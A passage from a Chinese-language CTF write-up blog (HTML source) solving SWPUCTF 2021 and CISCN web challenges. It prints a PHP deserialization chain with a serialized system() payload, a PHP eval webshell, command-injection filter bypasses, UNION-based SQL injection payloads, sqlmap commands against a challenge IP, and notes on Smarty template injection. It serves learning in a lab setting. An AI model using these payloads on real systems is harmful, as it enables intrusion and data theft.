class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22System%28%27cat+%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="SWPUCTF-2021-新生赛-easyupload1-0"   >
+          <a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1>
+      <p>检测文件头，改一下就行了，<code>flag</code>在<code>phpinfo</code>里面</p>
+
+        <h1 id="SWPUCTF-2021-新生赛-easyupload2-0"   >
+          <a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h1>
+      <p>检测后缀和文件头</p>
+
+        <h1 id="SWPUCTF-2021-新生赛-easyupload3-0"   >
+          <a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1>
+      <p>可以上传<code>.htaccess</code>来将<code>png</code>作为<code>php</code></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-caidao"   >
+          <a href="#SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1>
+      <p>加载了一张图片，但是一般来说，如果只加载图片，并不会能连接的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109200923250.png" alt="image-20230109200923250"></p>
+<p>但是用蚁剑连上，才发现<code>index.php</code>里面有</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo(&#x27;&lt;html&gt;&lt;head&gt;&lt;style&gt;body&#123;background:url(caidao.png) top left;background-size:100%;&#125;&lt;/style&gt;&lt;/head&gt;&lt;/html&gt;&#x27;);</span><br><span class="line">@eval($_POST[&#x27;wllm&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="SWPUCTF-2021-新生赛-easyrce"   >
+          <a href="#SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1>
+      <p>普通的<code>shell</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201242190.png" alt="image-20230109201242190"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-babyrce"   >
+          <a href="#SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1>
+      <p>提示如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201720863.png" alt="image-20230109201720863"></p>
+<p>用<code>burpsuite</code>给<code>COOKIE</code>添加一下<code>admin</code>字段为1</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201814743.png" alt="image-20230109201814743"></p>
+<p>访问<code>rasalghul.php</code>，直接命令执行，过滤空格，用<code>$&#123;IFS&#125;</code>代替空格即可</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201940275.png" alt="image-20230109201940275"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-hardrce"   >
+          <a href="#SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1>
+      <p>命令执行，但是过滤了很多东西</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205721004.png" alt="image-20230109205721004"></p>
+<p>但是由于是<code>php7</code>，所以可以利用取反来执行命令，参考<code>p神</code>的：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205707061.png" alt="image-20230109205707061"></p>
+<p>主要结论如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205850748.png" alt="image-20230109205850748"></p>
+<p>即用<code>python</code>稍微写一下就行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210209173.png" alt="image-20230109210209173"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>c%df%d0);<span class="comment">//system(&#x27;ls /&#x27;)</span></span><br></pre></td></tr></table></div></figure>
+
+<p>知道<code>flag</code>名字了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210301490.png" alt="image-20230109210301490"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">8</span>b%df%d0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>);<span class="comment">//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="SWPUCTF-2021-新生赛-finalrce"   >
+          <a href="#SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110140811427.png" alt="image-20230110140811427"></p>
+<p><code>exec</code>直接执行命令，但是过滤了很多东西，包括<code>ls</code>也过滤了，但是命令行中有比较特殊符号反引号以及<code>\</code>，这个常用来连接命令，可以看到如下例子，其实是差不多的。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141330808.png" alt="image-20230110141330808"></p>
+<p>所以这里可以用<code>l\s</code>来进行绕过，其他命令也是类似。</p>
+<p>那么就差一个回显了，由于重定向符号<code>&gt;</code>也被禁止了，那么这里可以用到<code>tee</code>命令，该命令可以通过管道符<code>|</code>将前一个命令的执行结果写入到文件中，效果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141934420.png" alt="image-20230110141934420"></p>
+<p>那么就可以通过该命令来将需要命令结果写入到文件中，然后访问文件即可访问到命令结果。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=l\s%20/%20|%20tee%201.txt</span><br></pre></td></tr></table></div></figure>
+
+<p>对应访问</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110142057595.png" alt="image-20230110142057595"></p>
+<p>同样道理获取<code>flag</code>，但是这里还过滤了<code>la</code>，所以同样道理，给<code>flllllaaaaaaggggggg</code>的对应<code>la</code>处加上<code>\</code>符号也是一样的。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=c\at%20/flllll\aaaaaaggggggg%20|%20tee%202.txt</span><br></pre></td></tr></table></div></figure>
+
+<p>访问<code>2.txt</code>即可得到<code>flag</code></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-easy-sql"   >
+          <a href="#SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1>
+      <p>参数是<code>wllm</code>，几个<code>sql</code>注入常见考点</p>
+
+        <h2 id="前置知识"   >
+          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>
+      <p>同样的，对应<code>sql</code>语句也会有注释，常用的注释有下</p>
+<ul>
+<li><code>#</code>：但是在<code>url</code>中该符号有特殊意义，所以使用的时候需要改成编码<code>%23</code>才行</li>
+<li><code>--</code>：用的时候通常需要为<code>--空格 </code>形式才能正常解析，而在<code>sql</code>中<code>+</code>和<code>--</code>连用时作用和空格类似，所以<code>--+</code>成为常见的<code>sql</code>注入语句，当然<code>--%20</code>也是一样的。</li>
+</ul>
+<p>所以这里先使用单引号<code>&#39;</code>将之闭合，然后语句最后使用<code>--+</code>来将后面的多余语句进行注释，比如原语句是</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> ... </span><br></pre></td></tr></table></div></figure>
+
+<p>用户输入为<code>1&#39; order by 1--+</code>，那么结果即为</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+&#x27; and ... </span></span><br></pre></td></tr></table></div></figure>
+
+<p>原本的<code>&#39; and ... </code>这个就不会执行了，而<code>order by 1</code>会顺利执行，完成相关的<code>sql</code>语句注入查询。</p>
+
+        <h2 id="1-判断类型"   >
+          <a href="#1-判断类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h2>
+      <p>首先需要判断注入类型，常见的有字符，数字，时间，布尔等。</p>
+<p>输入<code>wllm=1</code>正常回显，但是输入<code>wllm=1&#39;</code>会显示错误，代表引号匹配不对，表明是字符型的注入。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-字段数查询"   >
+          <a href="#2-字段数查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-字段数查询" class="headerlink" title="2.字段数查询"></a>2.字段数查询</h2>
+      <p>需要知道该表有几个字段，才能进行后续的回显点查询，这里可以用到<code>order by</code>来进行查询。</p>
+<p><code>order by </code>的意思就是依据输入的字段来进行排序，这里既可以输入字段名字，也可以输入字段序号，比如下表</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173717231.png" alt="image-20230110173717231"></p>
+<p>输入<code>order by games_played</code>和输入<code>order by 4</code>其效果是一样的，但是如果输入<code>order by 5</code>，而该表又只有4个字段，那么就会出错，如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173850560.png" alt="image-20230110173850560"></p>
+<p>可以通过这个方法来判断有几个字段，这里输入<code>order by 4</code>回显错误，表明字段数为3。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175556882.png" alt="image-20230110175556882"></p>
+
+        <h2 id="3-回显点查询"   >
+          <a href="#3-回显点查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-回显点查询" class="headerlink" title="3.回显点查询"></a>3.回显点查询</h2>
+      <p>可以看到输入<code>wllm=1</code>是正常回显的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173359149.png" alt="image-20230110173359149"></p>
+<p>而<code>xxx</code>和<code>yyy</code>就是可能存在的回显点，那么需要判断这个回显点是在那个字段，这里就可以使用常见的<code>select 1,2,3</code>这种了。</p>
+
+        <h3 id="select-1-2-3"   >
+          <a href="#select-1-2-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-1-2-3" class="headerlink" title="select 1,2,3"></a>select 1,2,3</h3>
+      <p>直接查询情况如下，可以看到，相当于直接创建了一个与<code>1,2,3</code>有关的表，字段数为输入的数字个数，即3个，对应数据也能理解</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175654372.png" alt="image-20230110175654372"></p>
+<p>而当和联合查询<code>union select</code>相结合使用的时候，就需要输入的这些字段数和另一个表的字段数一样才会正常查询</p>
+<p>比如某个表如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180052010.png" alt="image-20230110180052010"></p>
+<p>联合查询语句</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180123723.png" alt="image-20230110180123723"></p>
+<p>相当于把两个表进行合并，而如果字段数不一致，就会出错，比如减去一个字段数</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180254544.png" alt="image-20230110180254544"></p>
+<p>可以看到查询字段数不一致的错误，这里也就是为什么之前需要判断表有几个字段的原因。</p>
+
+        <h3 id="结合查询"   >
+          <a href="#结合查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#结合查询" class="headerlink" title="结合查询"></a>结合查询</h3>
+      <p>把前一张表置空，也就是<code>where wllm=xx</code>，<code>xx</code>不存在的时候，前一张表查出来自然就是空的。</p>
+<p>然后再联合查询<code>select 1,2,3...</code>，依据返回数据，判断回显点在哪个字段</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180737312.png" alt="image-20230110180737312"></p>
+<p>即可知道回显的数据在第2，3两个字段，那么就依据这两个字段，进行相关数据查询，这里就从第2个字段入手。</p>
+
+        <h2 id="4-查询库名"   >
+          <a href="#4-查询库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-查询库名" class="headerlink" title="4.查询库名"></a>4.查询库名</h2>
+      <p>利用<code>database()</code>函数来查询</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181009012.png" alt="image-20230110181009012"></p>
+<p>库名为<code>test_db</code></p>
+
+        <h2 id="5-查询表名"   >
+          <a href="#5-查询表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-查询表名" class="headerlink" title="5.查询表名"></a>5.查询表名</h2>
+      <p>利用<code>group_concat()</code>函数来查询</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到，这里想要提供库的名字<code>test_db</code>，所以之前需要查询到库名。</p>
+<p>这里也有一点前置知识，也就是<code>information_schema</code>是<code>mysql</code>中的一个信息数据库，保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。比如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38972910/article/details/86012110" >(48条消息) mysql自带的information_schema.tables是什么？_你的小伙伴啊的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>那么即可查询到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181442257.png" alt="image-20230110181442257"></p>
+<p>可以看到存在两个表为<code>test_tb</code>和<code>users</code></p>
+
+        <h2 id="6-查询字段名"   >
+          <a href="#6-查询字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-查询字段名" class="headerlink" title="6.查询字段名"></a>6.查询字段名</h2>
+      <p>方法和查询表名类似，需要提供表名，之前查表名的原因</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span><span class="operator">-</span>xx<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>
+
+<p>结果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181822291.png" alt="image-20230110181822291"></p>
+
+        <h2 id="7-查询数据"   >
+          <a href="#7-查询数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-查询数据" class="headerlink" title="7.查询数据"></a>7.查询数据</h2>
+      <p>方法类似，查询<code>flag</code>内容</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(flag),3 from test_tb--+ </span></span><br></pre></td></tr></table></div></figure>
+
+<p>得到最终<code>flag</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110182041851.png" alt="image-20230110182041851"></p>
+
+        <h2 id="SQLMAP"   >
+          <a href="#SQLMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -dbs</span><br><span class="line"><span class="meta">#</span><span class="bash">得到所有数据库名</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db --tables</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中的所有表名字</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db --columns</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中test_db表中的所有字段名字，这个跑不出来</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db -C flag -dump</span><br><span class="line"><span class="meta">#</span><span class="bash">跑不出来</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="CISCN-2019华东南-Web11"   >
+          <a href="#CISCN-2019华东南-Web11" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h1>
+      <p>看到这两个，猜测是<code>smarty</code>的<code>Server Side Template Injection</code>即<code>SSTI</code>模板注入，这个就需要一些前置知识了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111154621041.png" alt="image-20230111154621041"></p>
+
+        <h2 id="前置知识-1"   >
+          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2>
+      <p>简单安装使用：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/enjoyxp/article/details/2050325" >(48条消息) windows环境下smarty安装最简明教程_enjoyxp的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272393#h3-12" >Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>首先应该是为什说<code>smarty</code>能够进行模板注入，其实主要在于它的<code>string</code>模板，也就是如下的代码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="前期调用链"   >
+          <a href="#前期调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#前期调用链" class="headerlink" title="前期调用链"></a>前期调用链</h3>
+      <p>前期会有一些链子调用到关键函数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">display</span><br><span class="line">Smarty_Internal_TemplateBase._execute</span><br><span class="line"></span><br><span class="line">Smarty_Internal_Template.render</span><br><span class="line">//这里会进行模板是否存在的检测，不存在就直接返回了，这里的模板指的是`string:&#123;phpinfo()&#125;`中的`string`，然后就会进行模板的一些处理</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.render</span><br><span class="line">//这里也会进行模板检测，不太清楚和前面有啥区别</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.process</span><br><span class="line">//这个函数比较关键，后续基本都是从这里展开的</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="模板创建"   >
+          <a href="#模板创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板创建" class="headerlink" title="模板创建"></a>模板创建</h3>
+      <p>当最开始没有进行该模板创建时，会创建模板，在前期调用链中还有后续的一些链子</p>
